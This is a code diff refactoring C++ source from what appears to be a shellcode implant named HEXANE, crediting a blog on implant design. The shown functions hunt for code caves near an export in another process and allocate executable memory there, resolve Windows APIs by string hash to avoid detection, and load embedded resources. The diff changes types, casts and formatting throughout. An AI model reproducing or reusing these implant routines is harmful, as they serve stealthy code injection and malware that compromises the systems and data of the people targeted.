@@ -135,8 +135,8 @@ namespace Memory {
     VOID ContextInit() {
         // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
 
-        HEXANE_CTX Instance = {};
-        LPVOID MmAddr = 0;
+        HEXANE_CTX Instance = { };
+        LPVOID MmAddr = { };
         SIZE_T MmSize = 0;
         ULONG Protect = 0;
 
@@ -232,13 +232,14 @@ namespace Memory {
         return Export;
     }
 
-    UINT_PTR MmCaveHunter(HANDLE Proc, UINT_PTR Export, SIZE_T Size) {
+    UINT_PTR MmCaveHunter(HANDLE Proc, LPVOID Export, SIZE_T Size) {
         HEXANE
 
-        UINT_PTR Region = 0;
+        UINT_PTR Region     = 0;
+        UINT_PTR Address    = RCAST(UINT_PTR, Export);
 
-        for (Region = (Export & 0xFFFFFFFFFFF70000) - 0x70000000;
-             Region < Export + 0x70000000;
+        for (Region = (Address & 0xFFFFFFFFFFF70000) - 0x70000000;
+             Region < Address + 0x70000000;
              Region += 0x10000) {
             if ((Ctx->Nt.NtAllocateVirtualMemory(Proc, RCAST(LPVOID*, &Region), 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)) >= 0) {
                 return Region;
@@ -248,35 +249,31 @@ namespace Memory {
         return 0;
     }
 
-    UINT_PTR LdrGetExport(PBYTE Module, PBYTE Export) {
+    UINT_PTR LdrGetExport(LPSTR Module, LPSTR Export) {
         HEXANE
 
-        UINT_PTR pExport = 0;
-        INT reload = 0;
+        UINT_PTR pExport    = 0;
+        INT reload          = 0;
 
         while (!pExport) {
-            if (!(FPTR2(pExport,
-                        Utils::GetHashFromStringA((LPSTR)Module, x_strlen((LPSTR)Module)),
-                        Utils::GetHashFromStringA((LPSTR)Export, x_strlen((LPSTR)Export))))) {
-                if (reload ||
-                    !(Ctx->win32.LoadLibraryA((LPCSTR)Module))) {
+            if (!(FPTR2(pExport, Utils::GetHashFromStringA(Module, x_strlen(Module)), Utils::GetHashFromStringA(Export, x_strlen(Export))))) {
+                if (reload || !(Ctx->win32.LoadLibraryA(SCAST(LPCSTR, Module)))) {
                     goto defer;
                 }
                 reload++;
             }
         }
-
     defer:
         return pExport;
     }
 
-    ORSRC LdrGetIntResource(HMODULE Base, INT RsrcId) {
+    PRSRC LdrGetIntResource(HMODULE Base, INT RsrcId) {
         HEXANE
 
         HRSRC hResInfo  = { };
-        ORSRC Object    = { };
+        PRSRC Object    = { };
 
-        Object = (ORSRC)Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, sizeof(RSRC));
+        Object = SCAST(PRSRC, Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, sizeof(RSRC)));
 
         if (
             !(hResInfo          = Ctx->win32.FindResourceA(Base, MAKEINTRESOURCE(RsrcId), RT_RCDATA)) ||
